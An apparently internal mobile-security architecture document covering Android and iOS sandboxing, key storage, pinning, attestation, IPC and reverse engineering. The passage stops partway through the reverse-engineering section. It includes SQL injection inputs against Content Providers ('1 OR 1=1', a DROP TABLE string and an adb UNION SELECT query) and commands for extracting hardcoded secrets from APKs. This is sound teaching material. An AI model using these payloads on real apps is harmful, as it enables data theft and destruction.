# Mobile Application Security Architecture (Android/iOS): Internal Engineering & Security Breakdown

> **Classification:** Internal Engineering / Security Document  
> **Audience:** Mobile Security Engineers, Reverse Engineers, AppSec Teams, Interview Candidates  
> **Scope:** Full-stack mobile security — OS sandboxing, cryptography, IPC, reverse engineering mechanics, RASP, and observability  
> **Version:** 1.0

---

## Table of Contents

1. [Execution Narrative & OS Sandboxing](#1-execution-narrative--os-sandboxing)
2. [Local Storage & Cryptography](#2-local-storage--cryptography)
3. [Network Communication & API Trust](#3-network-communication--api-trust)
4. [Inter-Process Communication (IPC)](#4-inter-process-communication-ipc)
5. [Attack Mechanics & Reverse Engineering](#5-attack-mechanics--reverse-engineering)
6. [Security Controls & Defensive Mechanics](#6-security-controls--defensive-mechanics)
7. [Attack Surface Mapping](#7-attack-surface-mapping)
8. [Failure Points & Edge Cases](#8-failure-points--edge-cases)
9. [Mitigations & Observability](#9-mitigations--observability)
10. [Interview Questions](#10-interview-questions)

---

## Foundational Framing

Mobile application security is fundamentally about understanding **trust boundaries** — where does the OS enforce isolation versus where does it rely on the application to enforce its own security? The fundamental architecture differences between Android and iOS determine which attacks are possible:

- **Android:** Linux-based, each app runs as a unique Linux user (UID), process isolation via Linux DAC (Discretionary Access Control). More open ecosystem means more attack surface.
- **iOS:** Mach microkernel + BSD subsystem, hardware-enforced code signing, Secure Enclave for cryptographic operations, significantly more restrictive app capabilities model.

Both models assume the OS kernel is trustworthy. When the device is rooted/jailbroken, this assumption breaks, and all security guarantees become best-effort.

---

## 1. Execution Narrative & OS Sandboxing

### 1.1 Android: From APK Installation to Running Process

**Step 1: APK Verification at Install Time**

```
User taps "Install" / ADB install / Play Store delivery
         │
         ▼
PackageManagerService (system_server process):
  1. Parse AndroidManifest.xml
  2. Verify APK signature (v1/v2/v3/v4):
     - v1 (JAR signing): signs individual files in ZIP
     - v2 (APK Signature Block): signs the entire APK bytes
     - v3 (Rotation support): adds signing key rotation capability
     - v4 (Merkle tree): enables incremental installation (Android 11+)
  3. Verify certificate chain:
     - Self-signed is valid (unlike web PKI, there is no CA requirement)
     - Certificate must remain consistent across updates
     - Different certificate = different app (upgrade rejected)
  4. Check permissions declared in manifest against platform policies
  5. Assign unique UID:
     - Each app gets a unique Linux user ID (10000-19999 range)
     - App runs as this UID for its entire lifecycle
     - Files created by app are owned by this UID
  6. Extract to /data/app/{package_name}-{random}/
  7. Run dexopt / ART compilation (AOT or JIT depending on Android version)
```

**Step 2: App Launch — The Zygote Fork Model**

```
┌─────────────────────────────────────────────────────────────────────┐
│  ZYGOTE PROCESS (starts at boot, runs as root initially)           │
│                                                                     │
│  Pre-loads: Android framework classes, shared libraries             │
│  Listens on: /dev/socket/zygote (UNIX domain socket)               │
│  Purpose: Fast app startup by fork() instead of exec()             │
└─────────────────────────────────────────────────────────────────────┘
                              │
    ActivityManagerService sends "start app" command to Zygote
                              │
                              ▼
                        fork() syscall
                              │
              ┌───────────────┘
              ▼
    Child process (new app process):
      1. Drop root privileges → setuid(app_uid)
      2. Apply SELinux context (e.g., untrusted_app_27)
      3. Set up seccomp-bpf filter (restrict available syscalls)
      4. Initialize app's class loader with APK DEX files
      5. Call Application.onCreate()
      6. Launch main Activity
```

**Why Zygote?** A cold fork from scratch of an Android app would require loading hundreds of MB of framework classes. Zygote pre-loads all of these into memory once, then copies-on-write for each new process. This reduces app startup from seconds to milliseconds.

**Android SELinux Enforcement:**

```
Every process has an SELinux context, enforced by the kernel:
  - Zygote: u:r:zygote:s0
  - New app (default): u:r:untrusted_app:s0:c{uid},{packageDomain}
  - System app: u:r:system_app:s0
  - Platform: u:r:platform_app:s0

Policy rules (in /system/etc/selinux/):
  "untrusted_app can read/write files labeled app_data_file"
  "untrusted_app CANNOT read files labeled system_data_file"
  
Even if the app has root privileges (rooted device), SELinux enforcement
must be disabled (setenforce 0) for many attacks to succeed.
```

**Android Permission Model:**

```
Permission categories:
  NORMAL: granted at install, no user prompt
    (e.g., INTERNET, ACCESS_NETWORK_STATE)
  
  DANGEROUS: must be granted at runtime (Android 6+)
    (e.g., READ_CONTACTS, CAMERA, ACCESS_FINE_LOCATION)
    → User can revoke at any time in Settings
    → App must check with ContextCompat.checkSelfPermission() before use
  
  SIGNATURE: granted only to apps signed with the same certificate
    (Used for IPC between related apps from the same developer)
  
  PRIVILEGED: only for apps pre-installed in /system/priv-app/
  
  DEVELOPMENT: granted only via ADB, requires Developer Options

Runtime permission flow:
  app calls: ActivityCompat.requestPermissions(activity, permissions[], requestCode)
  OS shows: dialog "Allow AppName to access contacts?"
  User grants/denies
  OS calls: onRequestPermissionsResult() in the app
  App stores result in: getSharedPreferences() or logic
```

---

### 1.2 iOS: From IPA to Running Process

**Step 1: App Signing and Entitlements**

iOS code signing is fundamentally different from Android — it involves Apple's certificate hierarchy:

```
Apple Root CA
  └── Apple Worldwide Developer Relations CA
        └── Developer Certificate (team-specific)
              └── App signing identity (per-developer, per-device for dev builds)

For App Store distribution:
  └── App Store distribution certificate (Apple signs the final IPA)

The signing process:
  1. Developer signs code: codesign -f -s "iPhone Distribution: Corp" App.app
  2. Each binary, dylib, framework has a Code Directory structure:
     - Hash of the code requirements
     - Hash of every 4096-byte page of the binary
     - Team ID, Bundle ID, entitlements hash
  3. The codesign signature covers the hash tree → any modification → invalid signature

Entitlements (XML plist embedded in the signature):
  com.apple.security.application-groups → access shared containers with other apps
  com.apple.developer.associated-domains → universal links
  keychain-access-groups → shared Keychain access
  com.apple.developer.nfc.readersession.formats → NFC capability
  These are ENFORCED by the kernel — cannot be claimed without Apple approval
```

**Step 2: iOS Process Launch**

```
launchd (PID 1, replaces traditional init)
  │
  ├── XPC service → SpringBoard (home screen, app launch)
  │
  └── When user taps app icon:
        SpringBoard → MobileLaunchd → create new process
              │
              ▼
        dyld (dynamic linker) runs in process context:
          1. Load main binary from App Bundle
          2. Verify code signature of every page as loaded
             (AMFI — Apple Mobile File Integrity — kernel extension validates this)
          3. If signature invalid: SIGKILL immediately, before any code runs
          4. Load dylib dependencies (/usr/lib/, @rpath)
          5. Set up memory layout: ASLR randomizes base addresses
          6. Call main() / UIApplicationMain()

iOS Sandbox (Seatbelt / Sandbox.kext):
  - Each app gets a unique sandbox container:
    /var/mobile/Containers/Data/Application/{UUID}/
    Subdirectories: Documents/, Library/, tmp/
  - Sandbox policy (compiled rules) enforced by kernel:
    "allow file-read* on subpath /var/mobile/Containers/Data/Application/{own-UUID}"
    "deny file-read* on subpath /var/mobile/Containers/Data/Application/{other-UUID}"
  - Network, IPC, device access: all controlled by entitlements + sandbox policy
```

**iOS Permission Model:**

```
Unlike Android: permissions are capability-based with TCC (Transparency, Consent, Control)
  
TCC Database: /private/var/mobile/Library/TCC/TCC.db
  Records: which apps have been granted which capabilities by the user
  Protected by: SIP (System Integrity Protection) on macOS, 
                rootful process protection on iOS
  
Permission enforcement:
  App requests: [AVCaptureDevice requestAccessForMediaType:completionHandler:]
  OS queries TCC database
  If not previously answered: show dialog to user
  Store result in TCC database
  Framework enforces: camera frames not delivered if permission denied
    (enforced in kernel driver, not just in userspace framework)

Entitlements vs permissions:
  Entitlements: capabilities the developer must request from Apple at build time
    → Cannot access NFC without entitlement, regardless of user permission
  Permissions (TCC): user-facing consent for sensitive data access
    → Can have camera entitlement but user still denies camera access
```

---

## 2. Local Storage & Cryptography

### 2.1 Android: Data Storage Mechanisms

**SharedPreferences (NOT secure for sensitive data):**

```
Storage location: /data/data/{package}/shared_prefs/{name}.xml
Format: Plaintext XML
Permissions: r/w by app UID only (Linux DAC)

<map>
  <string name="api_token">eyJhbGci...</string>  ← DANGER: plaintext
  <boolean name="is_logged_in" value="true"/>
</map>

Security properties:
  - Protected from OTHER apps by Linux UID isolation
  - NOT protected from ROOT: root can read any file
  - NOT encrypted: if device is not encrypted (pre-Android 6 default), readable
  - Backed up by default (in ADB backup, Google Backup) → data exfiltration risk
  - Accessible if device USB debugging enabled and attacker has ADB access
```

**Android Keystore System:**

The Android Keystore is a hardware-backed (where available) cryptographic key storage system. The key NEVER leaves the secure hardware:

```
Hardware hierarchy:
  ┌─────────────────────────────────────────────────────────────┐
  │  Secure World (TEE — TrustZone, or StrongBox — separate SE) │
  │                                                             │
  │  Keystore TA (Trusted Application):                        │
  │    - Generates keys: never exported to Normal World        │
  │    - Operations: sign, encrypt, decrypt, verify            │
  │    - Keys wrapped in device-unique key (DUK)               │
  │    - DUK baked into hardware at factory, never readable     │
  └─────────────────────────────────────────────────────────────┘
             ↑ keymaster HAL
  ┌─────────────────────────────────────────────────────────────┐
  │  Normal World (Android OS)                                  │
  │                                                             │
  │  KeyStore service (system_server):                         │
  │    - Proxy between apps and TEE                            │
  │    - Key blobs stored in /data/misc/keystore/user_0/       │
  │    - Key blob = {key_material_encrypted_by_DUK}            │
  │      → Useless without TEE, useless on different device    │
  └─────────────────────────────────────────────────────────────┘
             ↑ KeyStore API (android.security.keystore)
  ┌─────────────────────────────────────────────────────────────┐
  │  App (untrusted_app SELinux domain)                         │
  │  Uses: KeyPairGenerator, KeyGenerator, Cipher, Signature   │
  └─────────────────────────────────────────────────────────────┘

Key generation with authentication binding:
KeyGenParameterSpec spec = new KeyGenParameterSpec.Builder(
    "my_key_alias",
    KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .setKeySize(256)
    .setUserAuthenticationRequired(true)       // Requires biometric/PIN
    .setUserAuthenticationValidityDurationSeconds(-1)  // Require auth per use
    .setStrongBoxBacked(true)                  // Use StrongBox if available
    .setInvalidatedByBiometricEnrollment(true) // Revoke on new fingerprint
    .build();
```

**Android Biometrics + Keystore Integration:**

```
User touches fingerprint sensor:
  1. Fingerprint hardware sends encrypted template to TEE
  2. TEE compares with stored templates (NEVER sent to Normal World)
  3. If match: TEE generates AuthToken {user_id, timestamp, authenticator_type, HMAC}
     HMAC signed with key shared ONLY between TEE and KeyStore
  4. AuthToken passed to Normal World
  5. App presents AuthToken to KeyStore when requesting crypto operation
  6. KeyStore verifies AuthToken HMAC (proves it came from TEE)
  7. If auth required: only unlock key if valid recent AuthToken presented
  8. TEE performs crypto operation with unlocked key
  
Result: fingerprint verification and key usage happen atomically in secure world
        No credential bypass possible from Normal World
```

**SQLite Database Security:**

```
Location: /data/data/{package}/databases/{name}.db
Encryption: SQLCipher (if used by developer) — AES-256 CBC or GCM
            Plain SQLite: completely unencrypted
            
Common mistake: developer encrypts "sensitive" fields but not the schema
  → Plaintext: table names, column names, relationships (metadata leak)
  → Even WITH encryption: database file size changes reveal query patterns
  
SQLCipher key derivation:
  Passphrase → PBKDF2-HMAC-SHA1(iter=64000) → AES-256 database key
  IV: random, stored in page header
  Page encryption: each 4096-byte page encrypted independently
    → Loss of one page doesn't corrupt entire database
    → IV is per-page (stored in first 16 bytes of page)
```

---

### 2.2 iOS: Data Storage Mechanisms

**Keychain:**

iOS Keychain is the gold standard for secure credential storage:

```
Keychain item protection classes (map to hardware states):
  
  kSecAttrAccessibleWhenUnlocked:
    Item accessible when: device is unlocked
    Encrypted with: device passcode key + Secure Enclave
    Key stored in: Secure Enclave (destroyed on lock)
    
  kSecAttrAccessibleAfterFirstUnlock:
    Item accessible when: after first unlock since reboot (background tasks)
    Encrypted with: derived key retained in memory after first unlock
    Common use: push notification tokens, refresh tokens
    
  kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly:
    Item accessible when: device unlocked AND passcode set
    NOT backed up: "ThisDeviceOnly" suffix prevents any backup
    Use case: biometric-protected credentials
    
  kSecAttrAccessibleAlways:
    Item accessible: always, even when locked (AVOID using this)
    Encrypted with: key not dependent on passcode
    
Keychain architecture:
  securityd (daemon, runs as _securityd user)
    → Manages all Keychain operations
    → Enforces access control based on:
       - Bundle ID (which app is asking?)
       - access-groups entitlement (which groups can access?)
       - Protection class (device state check)
    → Items encrypted with: per-item keys wrapped in class keys
       - Class keys stored in Secure Enclave
       - Item data: AES-256-GCM encrypted

Keychain storage:
  /private/var/Keychains/keychain-2.db (SQLite database)
  Data column: encrypted blob (AES-256-GCM)
  The database is NOT accessible to apps — only securityd reads it directly
```

**Secure Enclave (iOS/A-series hardware):**

```
The Secure Enclave Processor (SEP):
  - Separate processor with isolated memory
  - Runs its own microkernel (sepos)
  - Has its own boot ROM, akin to having its own secure boot
  - Communicates with Application Processor via mailbox (shared memory queue)
  
What SEP holds:
  - Biometric templates (fingerprint/face recognition data)
  - Unique ID (UID) fused into hardware at manufacture
  - Device Encryption Key (derived from UID + user passcode)
  - Cryptographic keys flagged as Secure Enclave-backed
  
Key operations in SEP:
  App requests ECDSA-P256 key pair generation:
    → Application Processor sends request to SEP via mailbox
    → SEP generates key pair internally
    → Private key NEVER leaves SEP
    → SEP returns: public key + key reference blob (opaque handle)
    → App stores blob in Keychain (blob is useless without SEP)
    
  App requests signing with SEP-backed key:
    → App sends data hash to SEP
    → SEP requires biometric authentication (Face ID/Touch ID) before signing
    → Face ID: TrueDepth camera data processed in SEP, never in AP
    → If auth passes: SEP signs with private key, returns signature
    → Private key material: never exposed to Application Processor
```

---

### 2.3 Key Derivation for File Encryption

**Android File-Based Encryption (FBE):**

```
Android 7+ default: File-Based Encryption (replaces FDE — Full Disk Encryption)

Key hierarchy:
  Hardware root key (fused into SoC)
    └── Derived Encryption Storage Key (DESK)
          ├── User credential key (derived from PIN/password via scrypt)
          │     └── User keys: used to encrypt CE (Credential Encrypted) storage
          └── Synthetic password (random, stored encrypted)
                └── DE (Device Encrypted) storage key: works before unlock
                
CE storage (Credential Encrypted):
  Files in: /data/user/{uid}/ and /data/data/{package}/
  Accessible: only after user authentication (unlock)
  Protected by: AES-256-XTS (per-file keys) wrapped by user credential key

DE storage (Device Encrypted):
  Files in: /data/user_de/{uid}/
  Accessible: at boot (for services that must work before unlock)
  Less security: not protected by user credential

Per-file keys:
  Each file has a unique AES-256-XTS encryption key
  That key is encrypted by the class key (CE or DE key)
  Class key is encrypted by the user credential key
  User credential key is encrypted by hardware key
  → Revoking user credential → all CE file keys inaccessible
```

**iOS File Data Protection:**

```
Similar four-class system:
  NSFileProtectionComplete → kSecAttrAccessibleWhenUnlocked
  NSFileProtectionCompleteUnlessOpen → accessible if open at lock time
  NSFileProtectionCompleteUntilFirstUserAuthentication → kSecAttrAccessibleAfterFirstUnlock
  NSFileProtectionNone → no protection

How it works (per file):
  1. File creation: OS generates random per-file key (256-bit AES)
  2. File content encrypted with per-file key using AES-256-CBC or XTS
  3. Per-file key is wrapped (encrypted) with the class key
  4. Class key derived from: device UID key (in SEP) + passcode key
  5. Wrapped per-file key stored in file's extended attributes
  
When device is locked:
  Class keys for "WhenUnlocked" protection are removed from memory
  → Files cannot be decrypted even with physical device access
  → Full disk dump yields only ciphertext
```

---

## 3. Network Communication & API Trust

### 3.1 TLS Configuration and Certificate Pinning

**Standard TLS (without pinning) — insufficient for high-security apps:**

```
Standard TLS certificate validation:
  1. Server presents certificate chain
  2. Device validates:
     a. Chain terminates at a trusted root CA (OS trust store)
     b. Hostname matches certificate CN/SAN
     c. Certificate not expired
     d. Certificate not revoked (OCSP or CRL)
  
  Vulnerability: 
    Any CA in the OS trust store can issue valid certs for your domain
    → Certificate Authority compromise or rogue CA
    → Enterprise MDM installing a trusted root (for traffic inspection)
    → User-installed certificate (for Burp Suite proxying)
```

**Certificate Pinning — embedding expected certificate identity:**

```
Two pinning approaches:

A) Certificate pinning (pin the exact leaf certificate):
  App stores: SHA-256 of DER-encoded certificate bytes
  On each TLS connection: compare server cert hash with pinned hash
  
  Code (Android OkHttp):
  CertificatePinner pinner = new CertificatePinner.Builder()
    .add("api.example.com", 
         "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .add("api.example.com",  // Backup pin (REQUIRED for emergency rotation)
         "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=")
    .build();
  
  Problem: When cert rotates → must update app (long tail of outdated apps)

B) Public key pinning (pin the SubjectPublicKeyInfo — SPKI):
  App stores: SHA-256 of the DER encoding of the SPKI structure
  The SPKI stays the same even when certificate expires/rotates
    (assuming same RSA/EC key pair is used for renewal)
  
  Computing the pin:
  openssl s_client -connect api.example.com:443 | \
    openssl x509 -pubkey -noout | \
    openssl pkey -pubin -outform der | \
    openssl dgst -sha256 -binary | base64
  
  More resilient: key pair can last years, cert renewed annually

C) CA/Intermediate pinning (pin the intermediate CA):
  App pins: SHA-256 of intermediate CA's SPKI
  Accepts: any leaf cert signed by that intermediate
  Trade-off: compromise of the intermediate CA → all pinned apps vulnerable
```

**iOS Network Security Configuration (ATS + pinning):**

```
App Transport Security (ATS) — iOS 9+ default:
  Enforces minimum TLS 1.2, AES cipher suites, forward secrecy
  Set in Info.plist:
  <key>NSAppTransportSecurity</key>
  <dict>
    <key>NSAllowsArbitraryLoads</key><false/>  <!-- Enforce ATS -->
    <key>NSExceptionDomains</key>
    <dict>
      <key>api.example.com</key>
      <dict>
        <key>NSIncludesSubdomains</key><true/>
        <key>NSRequiresCertificateTransparency</key><true/>
      </dict>
    </dict>
  </dict>

Certificate pinning on iOS — TrustKit or manual URLSession:
  URLSession custom challenge handler:
  
  func urlSession(_ session: URLSession, 
                   didReceive challenge: URLAuthenticationChallenge,
                   completionHandler: @escaping (URLSession.AuthChallengeDisposition, 
                                                  URLCredential?) -> Void) {
    guard challenge.protectionSpace.authenticationMethod == 
          NSURLAuthenticationMethodServerTrust,
          let serverTrust = challenge.protectionSpace.serverTrust else {
      completionHandler(.cancelAuthenticationChallenge, nil)
      return
    }
    
    // Extract server's leaf certificate
    let certificate = SecTrustGetCertificateAtIndex(serverTrust, 0)!
    let certificateData = SecCertificateCopyData(certificate) as Data
    
    // Compare against pinned hash
    let certHash = SHA256.hash(data: certificateData)
    let pinnedHash = Data(hexString: "AAAA...BBBB")
    
    if certHash == pinnedHash {
      completionHandler(.useCredential, URLCredential(trust: serverTrust))
    } else {
      completionHandler(.cancelAuthenticationChallenge, nil)
      // Log: pinning failure event (telemetry)
    }
  }
```

**Server-Side App Validation (Attestation):**

The question isn't just "is the server who they say they are" but also "is the app who it says it is":

```
Android SafetyNet / Play Integrity API:
  App calls: IntegrityTokenProvider.request(nonce)
  Google server verifies:
    - Is this a genuine Android device?
    - Is it passing CTS (Compatibility Test Suite)?
    - Is this app from Play Store? Unmodified?
    - Is the device BOOT_VERIFIED (bootloader unlocked = degraded verdict)
  Returns signed JWT (signed by Google):
    {
      "requestDetails": { "nonce": "..." },
      "appIntegrity": {
        "appRecognitionVerdict": "PLAY_RECOGNIZED",  // or "UNRECOGNIZED_VERSION"
        "certificateSha256Digest": ["AAAA..."]
      },
      "deviceIntegrity": {
        "deviceRecognitionVerdict": ["MEETS_DEVICE_INTEGRITY"]
        // "MEETS_BASIC_INTEGRITY" if bootloader unlocked
        // no labels if rooted
      }
    }
  Server receives JWT, verifies Google's signature, trusts app+device identity.

iOS App Attest:
  App generates key pair in Secure Enclave (non-exportable)
  App calls: DCAppAttestService.attest(keyId, clientDataHash:)
  Apple server verifies:
    - Is this a genuine Apple device?
    - Is this key from the Secure Enclave?
    - Does the app signature match the App Store?
  Returns signed CBOR attestation object
  Server verifies Apple's signature → trusts app identity
  
  For subsequent API calls:
  App calls: DCAppAttestService.generateAssertion(keyId, clientDataHash:)
    → TEE signs the request hash with the attested private key
    → Server verifies: same key as attested, data not tampered
```

### 3.2 Local and Network Architecture Diagram

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│  MOBILE DEVICE                                                                   │
│                                                                                  │
│  ┌──────────────────────────────────────────────────────────────────────────┐   │
│  │  App Process Sandbox                                                     │   │
│  │                                                                          │   │
│  │  ┌─────────────────────┐    ┌───────────────────────────────────────┐   │   │
│  │  │  Application Logic  │    │  Security Layer                       │   │   │
│  │  │  (Business logic,   │←───│  - TLS pinning (OkHttp/URLSession)   │   │   │
│  │  │   UI, data models)  │    │  - Keystore/Keychain API calls        │   │   │
│  │  └─────────────────────┘    │  - RASP checks                        │   │   │
│  │           │                 └───────────────────────────────────────┘   │   │
│  │           ▼                                │                             │   │
│  │  ┌─────────────────────┐                  │ Secure IPC (binder/XPC)     │   │
│  │  │  Local Storage      │                  ▼                             │   │
│  │  │  SQLite (encrypted) │    ┌───────────────────────────────────────┐   │   │
│  │  │  SharedPrefs (plain)│    │  OS Crypto Services                   │   │   │
│  │  │  Keychain/Keystore  │    │  Android: Keystore TEE/StrongBox       │   │   │
│  │  │  App Container      │    │  iOS: Secure Enclave + securityd       │   │   │
│  │  └─────────────────────┘    └───────────────────────────────────────┘   │   │
│  └──────────────────────────────────────────────────────────────────────────┘   │
│                    │ TLS 1.3, mTLS (pinned certificate)                          │
│                    │ Certificate verified against pinned SPKI                    │
│                    ▼                                                              │
│  ┌──────────────────────────────────────────────────────────────────────────┐   │
│  │  OS Network Stack                                                        │   │
│  │  Android: java.net / OkHttp → BoringSSL                                  │   │
│  │  iOS: NSURLSession → SecureTransport → Network.framework                │   │
│  │  Both: Enforces minimum TLS version, cipher suites via OS policy         │   │
│  └──────────────────────────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────────────────────┘
                              │
                 Internet (TLS 1.3 enforced)
                              │
┌──────────────────────────────────────────────────────────────────────────────────┐
│  BACKEND INFRASTRUCTURE                                                          │
│                                                                                  │
│  ┌──────────────────┐     ┌───────────────────┐    ┌──────────────────────────┐ │
│  │  API Gateway     │     │  App Attestation  │    │  Certificate Authority   │ │
│  │  (TLS termination│────►│  Validation       │    │  (Intermediate CA for    │ │
│  │   mTLS client   │     │  SafetyNet/AppAttest│   │   pinned certificates)   │ │
│  │   cert required)│     │  verdict check    │    │                          │ │
│  └──────────────────┘     └───────────────────┘    └──────────────────────────┘ │
│          │                                                                        │
│  ┌───────▼────────────────────────────────────────────────────────────────────┐  │
│  │  Application Services (only accessible after attestation validated)       │  │
│  └───────────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────────────┘
```

---

## 4. Inter-Process Communication (IPC)

### 4.1 Android IPC: Binder, Intents, Content Providers

**The Binder — Android's IPC kernel driver:**

```
All Android IPC between apps goes through the Binder kernel driver:
  Device: /dev/binder
  Protocol: ioctl() on the device file
  
Binder transaction:
  Client process:
    1. Marshal data into Parcel (serialized format)
    2. Call binder_transaction() via ioctl(BINDER_WRITE_READ)
    3. Kernel: copies Parcel data from client address space to server address space
       (zero-copy where possible: uses mmap of the same physical pages)
    4. Client thread blocked waiting for reply
  
  Server (receiving) process:
    1. Kernel wakes server's binder thread pool thread
    2. Server reads Parcel from its address space
    3. Processes the request, returns reply Parcel
    4. Client thread unblocked, receives reply
    
  Security enforcement in Binder:
    Binder.getCallingUid() — kernel-provided, cannot be spoofed
    Binder.getCallingPid() — kernel-provided
    These are the ACTUAL UID/PID of the calling process
    Server can check: "Is this caller allowed to make this request?"
```

**Intents — the high-level IPC mechanism:**

```
Intent types and security implications:

1. Explicit Intent (safe):
   Intent intent = new Intent(this, TargetActivity.class);
   → Goes only to the specified component
   → No interception possible

2. Implicit Intent (risky if misused):
   Intent intent = new Intent("com.example.ACTION_VIEW_USER");
   startActivity(intent);
   → Android resolves: which app handles this action?
   → If multiple apps claim to handle it: user sees chooser
   → If attacker installs app claiming to handle same action: intent hijacking
   
3. Broadcast Intent:
   sendBroadcast(intent):
   → All apps with matching <intent-filter> receive it
   → If not protected: any app can receive sensitive broadcast
   
   SECURE broadcast:
   sendBroadcast(intent, "com.example.permission.MY_PERMISSION");
   → Only receivers with this permission can receive it
   
   OR: Use LocalBroadcastManager (stays within same process)
       Or: Use explicit target BroadcastReceiver

4. Pending Intent (intent delegation):
   PendingIntent pi = PendingIntent.getActivity(context, 0, intent, 
                       PendingIntent.FLAG_IMMUTABLE);
   → Passes to external component (notification system, etc.)
   → External component can "fire" the intent with app's identity
   → FLAG_MUTABLE is dangerous: external can modify the intent
   → CVE pattern: mutable PendingIntent + tapjacking = privilege escalation
```

**Content Providers — structured data sharing:**

```
Content Providers expose data via URIs:
  content://com.example.provider/users
  content://com.example.provider/users/42

Provider access control:
  <provider android:name=".MyProvider"
            android:authorities="com.example.provider"
            android:exported="false"  ← NOT accessible to other apps
            android:permission="com.example.READ_DATA"  ← requires permission
            android:readPermission="com.example.READ_DATA"
            android:writePermission="com.example.WRITE_DATA"
            android:grantUriPermissions="true"/>  ← can grant per-URI access

SQL injection in Content Providers:
  Many providers expose query() that maps to SQLite:
  
  Secure: db.query("users", projection, selection, selectionArgs, ...)
    → selection = "name = ?"
    → selectionArgs = ["Alice"]
    → SQLite parameterizes: no injection possible
  
  Insecure: db.rawQuery("SELECT * FROM users WHERE name = " + selection, null)
    → Attacker supplies: selection = "1 OR 1=1" → all rows returned
    → Or: "1; DROP TABLE users--"
  
  Attack via ADB:
  adb shell content query \
    --uri content://com.example.provider/users \
    --where "1=1 UNION SELECT * FROM sqlite_master--"
```

**Deep Links (Android):**

```
Intent filter in AndroidManifest.xml:
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="myapp" android:host="action"/>
</intent-filter>

Custom scheme (myapp://action?param=value):
  → Any app can send this intent (zero security verification)
  → Malicious website can trigger via: <a href="myapp://action?param=evil">
  → Parameters must be validated before processing

App Links (HTTPS deep links — more secure):
<intent-filter android:autoVerify="true">
    <data android:scheme="https" android:host="api.example.com"/>
</intent-filter>

Android verifies: https://api.example.com/.well-known/assetlinks.json
  [{
    "relation": ["delegate_permission/common.handle_all_urls"],
    "target": {
      "namespace": "android_app",
      "package_name": "com.example.myapp",
      "sha256_cert_fingerprints": ["AA:BB:CC:..."]
    }
  }]
  
This prevents link hijacking: only verified app can handle https links
But: if assetlinks.json verification fails (network unavailable at install):
  Falls back to browser (or all apps claiming the URL) → still vulnerable
```

---

### 4.2 iOS IPC: XPC, URL Schemes, App Groups

**XPC — iOS's secure IPC mechanism:**

```
XPC (Cross-Process Communication) replaces most classic IPC on iOS/macOS:
  - Each XPC service runs in its own sandbox
  - Communication via mach ports (kernel mediates)
  - Type-safe serialization: NSXPCInterface with protocol definition
  - Sandbox inheritance: XPC service can be MORE restricted than parent
  
Example: banking app's crypto operations in separate XPC service:
  
  Main App → XPC Service (com.bank.cryptoService):
    1. Main app calls: [proxy encryptData:data withReply:^(NSData* encrypted) {...}]
    2. XPC: serializes call to mach message
    3. Kernel: delivers to crypto service process
    4. Crypto service: performs AES encryption (with Keychain access)
    5. Returns encrypted data via XPC reply
    
  Security benefit: If main app is compromised, crypto service is separate sandbox
                    Attacker cannot access Keychain from main app context

Custom URL Schemes (less secure):
  myapp://action/path?param=value
  
  Registration in Info.plist:
  <key>CFBundleURLTypes</key>
  <array>
    <dict>
      <key>CFBundleURLSchemes</key>
      <array><string>myapp</string></array>
    </dict>
  </array>
  
  Handler in AppDelegate:
  func application(_ app: UIApplication, open url: URL, 
                   options: [UIApplication.OpenURLOptionsKey: Any]) -> Bool {
    // MUST validate: sourceApplication, url scheme, host, path
    // MUST sanitize: all parameters before use
    let sourceApp = options[.sourceApplication] as? String
    // sourceApp is provided by iOS — is the calling app's bundle ID
    // BUT: this can be spoofed in some older iOS versions
    // BETTER: validate parameters regardless of source
  }
  
Universal Links (more secure, like Android App Links):
  Requires: apple-app-site-association file at:
    https://domain.com/.well-known/apple-app-site-association
  iOS verifies at install time (CDN-cached by Apple)
  Only verified app receives these links (prevents URL scheme hijacking)

App Groups (shared storage between apps):
  Entitlement: com.apple.security.application-groups = ["group.com.example.shared"]
  Shared container: /private/var/mobile/Containers/Shared/AppGroup/{UUID}/
  Both apps in same group: read/write this container
  Security: OS enforces group membership via entitlement verification
  Risk: One app in group compromised → all shared data exposed
```

---

## 5. Attack Mechanics & Reverse Engineering

### 5.1 Static Analysis: Extracting Secrets from Binaries

**Android APK Analysis:**

```
Step 1: Extract APK (it's a ZIP file)
  unzip app.apk -d app_extracted/
  
Step 2: Analyze DEX bytecode
  apktool d app.apk -o app_decoded/
    → Decompiles DEX to Smali (assembly-like representation)
    → Extracts resources, AndroidManifest.xml (decoded)
  
  jadx -d output/ app.apk
    → Decompiles DEX to Java source (higher level, easier reading)
  
  grep -r "api_key\|password\|secret\|token" app_decoded/
    → Find hardcoded strings in Smali or resources
  
Step 3: Analyze native libraries (ARM/x86 .so files)
  lib/arm64-v8a/libnative.so
  
  strings lib/arm64-v8a/libnative.so | grep -E "https://|api|key|token"
    → Extract printable strings from native binary
  
  Ghidra / Binary Ninja / IDA Pro:
    - Open .so file
    - Analyze: ARM64 instruction set
    - Find JNI functions (Java_com_example_NativeClass_methodName convention)
    - Follow data flow to find hardcoded constants

Step 4: Check AndroidManifest.xml for security issues
  - android:debuggable="true" → allows ADB debugging on non-rooted device
  - android:allowBackup="true" → ADB backup extracts all app data
  - android:exported="true" on Activities/Services without permissions
  - android:networkSecurityConfig="@xml/network_security_config"
    → Check if cleartext traffic allowed or pinning disabled
```

**iOS IPA Analysis:**

```
Step 1: Extract IPA
  unzip app.ipa -d app_extracted/
  # Binary at: Payload/App.app/App (Mach-O universal binary)
  
Step 2: Analyze Mach-O binary
  file Payload/App.app/App
    → Mach-O universal binary with 2 architectures: arm64 arm64e
  
  otool -l App | grep -A 4 LC_ENCRYPTION_INFO
    → If cryptid=1: binary is FairPlay encrypted (App Store binary)
    → Must decrypt first (requires running on device and dumping)
  
  otool -L App
    → List all dynamically linked libraries
    → Look for: bundled private dylibs (interesting code)
  
  nm -gU App | grep " T "
